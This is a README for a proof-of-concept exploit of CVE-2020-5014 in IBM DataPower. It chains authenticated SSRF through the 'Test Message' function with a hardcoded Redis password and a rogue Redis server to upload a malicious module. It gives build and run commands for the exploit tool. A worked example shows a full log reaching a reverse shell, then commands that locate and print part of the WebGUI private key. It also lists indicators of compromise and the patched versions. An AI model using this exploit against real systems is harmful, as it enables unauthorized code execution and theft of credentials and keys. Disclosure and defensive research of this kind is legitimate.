# datapower-redis-rce-exploit (CVE-2020-5014)
A POC for IBM DataPower Authenticated Redis RCE Exploit abusing the "Test Message" Function.

![poc_demo](poc_demo.jpeg)

[Full explination and demo on Youtube](https://youtu.be/85V2ZL3IwQc)

[Blog post on tomcope.com](https://tomcope.com/exploit/2020/10/21/ibm-datapower-exploit-cve-2020-5014.html)

## Explanation

Using the DataPower "Send a Test Message" function available through a authenticated session to the DataPower WebGUI, it is possible to perform a SSRF attack against DataPowers internal Redis Server. The internal Redis server is password protected but appears to use a hardcoded password. This can then be combined with a pre-existing Redis RCE vulnerability to execute arbitrary code as the `drouter` user inside the DataPower underlying Linux operating system.

## Quick Start

1. Clone this repo
2. Compile the module:
   * `cd RedisModulesSDK/dpredisshell/`
   * `make`
3. Compile the Golang code
   * `go build`
4. Check the flags
   * `./datapower-redis-rce-exploit -h`
5. Run the exploit
   * `./datapower-redis-rce-exploit -dpip 1.2.3.4 -dpredismodule RedisModulesSDK/dpredisshell/dpredisshell.so -dpredispasswd xxx -fakeredisip 5.6.7.8`

## Example

Below is a worked example running DataPower via Docker and the exploit locally through localhost:

1. `docker run -it -e DATAPOWER_ACCEPT_LICENSE=true -e DATAPOWER_INTERACTIVE=true -e DATAPOWER_WORKER_THREADS=4 --network='host' ibmcom/datapower:10.0.1.1`
2. Login to DataPower with Username `admin` and password `admin`
3. Configure with WebGUI:
```
idg# config
Global mode
idg(config)# web-mgmt
Modify Web Management Service configuration

idg(config web-mgmt)# admin-state enabled
idg(config web-mgmt)# exit
idg(config)# write mem
Overwrite previously saved configuration? Yes/No [y/n]: y
Configuration saved successfully.
idg(config)# exit
idg# 
 ```
 4. Check the WebUI is up:
```
idg# show web-mgmt

web-mgmt [up] 
--------
 admin-state enabled 
 ip-address 0.0.0.0 
 port 9090 
 save-config-overwrite on 
 idle-timeout 600 Seconds
 acl web-mgmt  [up]
 ssl-config-type server 
 enable-sts on 

idg# 
```
5. Open a new terminal window
6. Clone this repo
   * `git clone https://github.com/copethomas/datapower-redis-rce-exploit`
7. Compile the module:
   * `cd RedisModulesSDK/dpredisshell/`
   * `make`
8. Compile the Golang code
   * `cd ../../`
   * `go build`
9.  Load the internal redis password into your shell. (Read the [Explanation](##explanation) for more details)
```
$ read DPREDISPASSWD
apples
$ echo $DPREDISPASSWD
apples
```
10. Run the exploit:
```
$ ./datapower-redis-rce-exploit -dpip 127.0.0.1 -dpport 9090 -dpredismodule RedisModulesSDK/dpredisshell/dpredisshell.so -dpredispasswd $DPREDISPASSWD -dpredisport 16379 -dpwebguipassword "admin" -dpwebguiuser "admin" -fakeredisip 127.0.0.1 -fakeredisport 8888
Main      - 2020/10/18 23:34:29 datapower-redis-rce-exploit - Created by Thomas Cope
Main      - 2020/10/18 23:34:29 Starting Rogue Redis Server...
Main      - 2020/10/18 23:34:29 Attempting to Login to Datapower...
FakeRedis - 2020/10/18 23:34:29 Starting Fake Redis Server on 127.0.0.1:8888
FakeRedis - 2020/10/18 23:34:29 Online and Ready!
Main      - 2020/10/18 23:34:29 Datapower Credentials Valid!
Main      - 2020/10/18 23:34:29 Datapower Login Token = JlkIp5wAvuQfSh5+cY49BovA.5
Main      - 2020/10/18 23:34:29 Exchanging Login token for auth cookie...
Main      - 2020/10/18 23:34:29 Got login Cookie OK! - [ibmwdp=1wBXDLzY9XdTNz4aD5+JQspc.5; Path=/; HttpOnly; Secure]+
Main      - 2020/10/18 23:34:29 Datapower Login Complete!
Main      - 2020/10/18 23:34:29 Attempting Redis exploit via Datapower 'Test Connection' ...
Main      - 2020/10/18 23:34:29 Performing Datapower 'Test Connection'...
FakeRedis - 2020/10/18 23:34:29 Accepting connection...
FakeRedis - 2020/10/18 23:34:29 Accepted Connection OK!
FakeRedis - 2020/10/18 23:34:29 Data : DatapowerRedis -> FakeRedis
FakeRedis - 2020/10/18 23:34:29 Data : DatapowerRedis <- FakeRedis
FakeRedis - 2020/10/18 23:34:29 Data : DatapowerRedis -> FakeRedis
FakeRedis - 2020/10/18 23:34:29 Data : DatapowerRedis <- FakeRedis
FakeRedis - 2020/10/18 23:34:29 Data : DatapowerRedis -> FakeRedis
FakeRedis - 2020/10/18 23:34:29 Data : DatapowerRedis <- FakeRedis
FakeRedis - 2020/10/18 23:34:29 Data : DatapowerRedis -> FakeRedis
FakeRedis - 2020/10/18 23:34:29 Data : DatapowerRedis <- FakeRedis
Main      - 2020/10/18 23:34:29 Datapower 'Test Connection' Finished OK
Main      - 2020/10/18 23:34:29 Datapower 'Test Connection' sent OK, waiting for redis connection...
FakeRedis - 2020/10/18 23:34:29 Data : DatapowerRedis -> FakeRedis
FakeRedis - 2020/10/18 23:34:29 Data : DatapowerRedis <- FakeRedis
FakeRedis - 2020/10/18 23:34:29 Data : DatapowerRedis -> FakeRedis
FakeRedis - 2020/10/18 23:34:29 Uploading module...
FakeRedis - 2020/10/18 23:34:29 Upload Complete!
Main      - 2020/10/18 23:34:29 Payload has been delivered to Datapower internal redis!
Main      - 2020/10/18 23:34:29 Performing clean up...
Main      - 2020/10/18 23:34:29 Performing Datapower 'Test Connection'...
FakeRedis - 2020/10/18 23:34:29 Error reading data from network connection: read tcp 127.0.0.1:8888->127.0.0.1:44207: read: connection reset by peer - (This is expected)
FakeRedis - 2020/10/18 23:34:29 Connection Closed
Main      - 2020/10/18 23:34:30 Datapower 'Test Connection' Finished OK
Main      - 2020/10/18 23:34:30 Requesting Reverse Shell via Datapower 'Test Connection' ...
Main      - 2020/10/18 23:34:30 Waiting for Reverse Shell...
Main      - 2020/10/18 23:34:30 Performing Datapower 'Test Connection'...
FakeRedis - 2020/10/18 23:34:30 Accepting connection...
Main      - 2020/10/18 23:34:30 Got Reverse Shell!
Main      - 2020/10/18 23:34:30 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
id
uid=1000(drouter) gid=1000(drouter) groups=1000(drouter)
ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
drouter        1       0  6 22:00 pts/0    00:02:15 /opt/ibm/datapower/root/drouter
drouter       24       1  0 22:00 pts/0    00:00:06 QuotaEnforcement unix:/opt/ibm/datapower/drouter/ramdisk2/sidecar-QuotaEnforcement-0x7f4f38c6e2c8 QuotaEnforcement
drouter       27      24  0 22:00 pts/0    00:00:05 /opt/ibm/datapower/root/dp-redis-server 127.0.0.1:16379
drouter       28      24  0 22:00 pts/0    00:00:08 /opt/ibm/datapower/root/dp-redis-sentinel 127.0.0.1:26379 [sentinel]
drouter       40       1  0 22:00 pts/0    00:00:05 dpmon -F dpmon -T -s 1 -c 900 -U /opt/ibm/datapower/drouter/temporary/dpmon/ -m /opt/ibm/datapower/drouter/temporary/dpmon/ -i 8 -M 31457280 -Z UTC -B 0
drouter       61      27  0 22:34 pts/0    00:00:00 [sh]
drouter       63      61  0 22:34 pts/0    00:00:00 
find / -name webgui-privkey.pem 2>/dev/null
/opt/ibm/datapower/root/secure/usrcerts/webgui-privkey.pem
head -2 /opt/ibm/datapower/root/secure/usrcerts/webgui-privkey.pem
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDYFBod9TmWZLKT
```
## IOCs

During the exploit DataPower will log multiple `url-open` errors with the internal redis url. This is due to redis not replying in the XML format expected by DataPower.

```
18:22:55	network	error	130	request	  	0x80e00040	xmlfirewall (map): url-open: Remote error on url 'http://127.0.0.1:16379/'
```

## Fix / Patch

Fixed in version 10.0.1.2 and 2018.4.1.15

- https://www.ibm.com/support/pages/node/6426789
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5014

## Links and Thanks

* https://github.com/n0b0dyCN/redis-rogue-server - For the Python Version of this Exploit and the `exp.c` Redis Module
* https://github.com/RicterZ/RedisModules-ExecuteCommand - For the Original Redis Module
* https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf - For the discovery of the Redis RCE

Original discovery made by Me (Thomas Cope) @ October 21, 2020 - Reported via Hackerone to IBM
